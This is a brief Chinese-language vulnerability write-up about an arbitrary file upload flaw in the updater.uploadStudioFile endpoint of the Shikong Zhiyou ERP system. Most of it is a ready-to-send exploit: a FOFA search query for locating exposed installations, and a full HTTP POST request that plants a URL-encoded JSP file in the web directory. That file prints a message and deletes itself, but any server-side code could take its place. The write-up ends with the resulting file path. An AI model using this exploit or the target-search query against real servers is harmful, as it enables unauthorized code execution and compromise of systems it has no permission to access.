## 时空智友ERP系统updater.uploadStudioFile接口处存在任意文件上传漏洞

时空智友ERP updater.uploadStudioFile接口处存在任意文件上传漏洞，恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患。

## fofa

```
body="login.jsp?login=null"
```

## poc

```
POST /formservice?service=updater.uploadStudioFile HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 1098
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close

content=<?xml%20version="1.0"?><root><filename>ceshi.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01%2008:00:00</lmtime></root><!--%3c%25%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%22%48%65%6c%6c%6f%20%57%6f%72%6c%64%21%22%29%3b%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%61%70%70%6c%69%63%61%74%69%6f%6e%2e%67%65%74%52%65%61%6c%50%61%74%68%28%72%65%71%75%65%73%74%2e%67%65%74%53%65%72%76%6c%65%74%50%61%74%68%28%29%29%29%2e%64%65%6c%65%74%65%28%29%3b%20%25%3e-->
```

![image-20240626214852120](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406262148311.png)

文件路径`http://127.0.0.1/update/temp/studio/ceshi.jsp`

![image-20240626215002638](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406262150767.png)